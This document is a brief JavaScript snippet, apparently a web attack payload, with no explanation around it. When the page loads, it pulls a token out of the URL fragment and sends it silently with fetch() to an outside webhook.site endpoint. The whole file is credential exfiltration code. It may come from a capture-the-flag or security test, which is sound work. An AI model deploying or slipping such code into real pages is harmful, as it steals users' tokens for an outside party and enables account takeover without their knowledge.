document.addEventListener("DOMContentLoaded", async () => {
    const token = location.hash.split("=")[1];
    await fetch(
        `https://webhook.site/99b75546-2e56-49cc-86ad-9d8cf417a223?token=${token}`,
        {
            mode: "no-cors",
        }
    );
});
